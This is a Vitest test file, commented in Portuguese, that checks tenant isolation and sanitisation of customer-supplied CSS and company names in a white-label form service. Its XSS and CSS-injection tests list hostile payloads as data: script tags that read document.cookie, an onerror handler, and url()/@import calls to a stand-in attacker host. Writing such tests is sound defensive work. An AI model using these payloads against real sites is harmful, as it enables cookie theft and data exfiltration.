import { afterAll, afterEach, beforeAll, describe, expect, it } from 'vitest';
import { closeApp, getApp } from '../helpers/api.js';
import { ORG_A, ORG_B } from '../helpers/orgs.js';
import { withTenant } from '../../apps/api/src/db/tenant.js';
import { injectMeta } from '../../apps/api/src/http/spa-shell.js';

/**
 * White-label e isolamento.
 *
 * O white-label junta duas coisas que normalmente não se encostam: conteúdo
 * escrito por um cliente e uma página que nós servimos. Três perguntas
 * precisam ter resposta:
 *
 *  1. O CSS de uma empresa alcança o formulário de outra?
 *  2. O CSS consegue sair da tag `<style>` e virar script?
 *  3. O que vem do banco consegue quebrar o HTML do shell?
 */

const HOST = 'localhost';

let slugDaAlfa: string;
let slugDaBeta: string;
let planoDaAlfa: string;
let planoDaBeta: string;

const CSS_DA_ALFA = '.cartao { border-radius: 3px }';
const CSS_DA_BETA = '.cartao { border-radius: 27px }';

async function publico(slug: string) {
  const app = await getApp();
  const resposta = await app.inject({ method: 'GET', url: `/f/${slug}`, headers: { host: HOST } });
  return resposta.json() as {
    customCss: string;
    showBranding: boolean;
    organization: { name: string; logoUrl: string | null };
  };
}

async function definirCss(organizationId: string, planCode: string, css: string) {
  await withTenant(organizationId, ({ tx }) =>
    tx.organization.update({ where: { id: organizationId }, data: { planCode, customCss: css } }),
  );
}

beforeAll(async () => {
  const [alfa, beta] = await Promise.all([
    withTenant(ORG_A.id, async ({ tx }) => ({
      plano: (await tx.organization.findFirstOrThrow({ select: { planCode: true } })).planCode,
      slug: (
        await tx.form.findFirstOrThrow({
          where: { status: 'published', deletedAt: null },
          select: { slugPublic: true },
        })
      ).slugPublic,
    })),
    withTenant(ORG_B.id, async ({ tx }) => ({
      plano: (await tx.organization.findFirstOrThrow({ select: { planCode: true } })).planCode,
      slug: (
        await tx.form.findFirstOrThrow({
          where: { status: 'published', deletedAt: null },
          select: { slugPublic: true },
        })
      ).slugPublic,
    })),
  ]);

  planoDaAlfa = alfa.plano;
  slugDaAlfa = alfa.slug;
  planoDaBeta = beta.plano;
  slugDaBeta = beta.slug;
});

afterEach(async () => {
  await Promise.all([
    withTenant(ORG_A.id, ({ tx }) =>
      tx.organization.update({ where: { id: ORG_A.id }, data: { planCode: planoDaAlfa, customCss: null } }),
    ),
    withTenant(ORG_B.id, ({ tx }) =>
      tx.organization.update({ where: { id: ORG_B.id }, data: { planCode: planoDaBeta, customCss: null } }),
    ),
  ]);
});

afterAll(closeApp);

describe('o CSS não atravessa a fronteira', () => {
  it('cada formulário serve o CSS da própria empresa', async () => {
    await definirCss(ORG_A.id, 'business', CSS_DA_ALFA);
    await definirCss(ORG_B.id, 'business', CSS_DA_BETA);

    const daAlfa = await publico(slugDaAlfa);
    const daBeta = await publico(slugDaBeta);

    expect(daAlfa.customCss).toContain('3px');
    expect(daAlfa.customCss).not.toContain('27px');

    expect(daBeta.customCss).toContain('27px');
    expect(daBeta.customCss).not.toContain('3px');
  });

  it('empresa sem CSS não herda o da outra', async () => {
    await definirCss(ORG_A.id, 'business', CSS_DA_ALFA);

    const daBeta = await publico(slugDaBeta);
    expect(daBeta.customCss).toBe('');
  });

  it('o nome e o logo também não atravessam', async () => {
    await withTenant(ORG_A.id, ({ tx }) =>
      tx.organization.update({ where: { id: ORG_A.id }, data: { logoUrl: 'https://cdn.alfa.test/logo.png' } }),
    );

    const daBeta = await publico(slugDaBeta);

    expect(daBeta.organization.name).toBe(ORG_B.name);
    expect(daBeta.organization.logoUrl).not.toBe('https://cdn.alfa.test/logo.png');

    await withTenant(ORG_A.id, ({ tx }) =>
      tx.organization.update({ where: { id: ORG_A.id }, data: { logoUrl: null } }),
    );
  });
});

describe('o CSS não vira script', () => {
  it('nenhum vetor de fuga sobrevive até o renderizador', async () => {
    // O caminho completo: gravado direto no banco (pulando a validação da API,
    // que é o pior caso realista) e lido pelo renderizador público.
    const vetores = [
      '</style><script>alert(document.cookie)</script>',
      '.a { color: #000 } </style><img src=x onerror=alert(1)>',
      '.a { background: url("https://atacante.test/?c=roubado") }',
      '@import url("https://atacante.test/x.css");',
      '.a { background: \\75 rl(https://atacante.test) }',
      '.a { behavior: url(#default#userData) }',
    ];

    for (const vetor of vetores) {
      await definirCss(ORG_A.id, 'business', vetor);
      const servido = (await publico(slugDaAlfa)).customCss;

      expect(servido, vetor).not.toContain('<');
      expect(servido.toLowerCase(), vetor).not.toContain('script');
      expect(servido.toLowerCase(), vetor).not.toContain('url(');
      expect(servido.toLowerCase(), vetor).not.toContain('atacante');
    }
  });

  it('o CSS gravado por um plano que perdeu o recurso para de sair', async () => {
    // Cenário concreto: a empresa gravou CSS no Business, caiu para Starter por
    // falta de pagamento, e o CSS continua no banco. Ele não pode ser servido.
    await definirCss(ORG_A.id, 'business', CSS_DA_ALFA);
    expect((await publico(slugDaAlfa)).customCss).toContain('3px');

    await withTenant(ORG_A.id, ({ tx }) =>
      tx.organization.update({ where: { id: ORG_A.id }, data: { planCode: 'free' } }),
    );

    expect((await publico(slugDaAlfa)).customCss).toBe('');
  });
});

describe('o shell HTML não quebra com dado do banco', () => {
  const shell = '<html><head><title>Antigo</title></head><body><div id="root"></div></body></html>';

  it('troca o título e injeta as tags antes de </head>', () => {
    const html = injectMeta(shell, {
      title: 'Pesquisa da Alfa',
      tags: [{ attr: 'property', key: 'og:title', content: 'Pesquisa da Alfa' }],
    });

    expect(html).toContain('<title>Pesquisa da Alfa</title>');
    // Dois títulos no mesmo documento fazem o robô escolher — e ele escolhe o
    // primeiro, que seria o genérico do índice.
    expect(html).not.toContain('Antigo');
    expect(html.indexOf('og:title')).toBeLessThan(html.indexOf('</head>'));
  });

  it('escapa nome de empresa hostil', () => {
    const html = injectMeta(shell, {
      title: 'Formulário',
      tags: [
        { attr: 'property', key: 'og:site_name', content: '"><script>alert(document.cookie)</script>' },
      ],
      faviconUrl: 'https://cdn.test/i.png"><script>alert(1)</script>',
    });

    // O nome da empresa é digitado pelo cliente e termina dentro de um atributo
    // entre aspas. Sem escape, `"` fecha o atributo e o resto vira markup.
    expect(html).not.toContain('<script>');
    expect(html).toContain('&lt;script&gt;');
    expect(html).toContain('&quot;');
  });

  it('não perde as tags quando o shell não tem </head>', () => {
    const html = injectMeta('<div id="root"></div>', {
      title: 'Formulário',
      tags: [{ attr: 'name', key: 'robots', content: 'noindex' }],
    });

    expect(html).toContain('robots');
  });
});
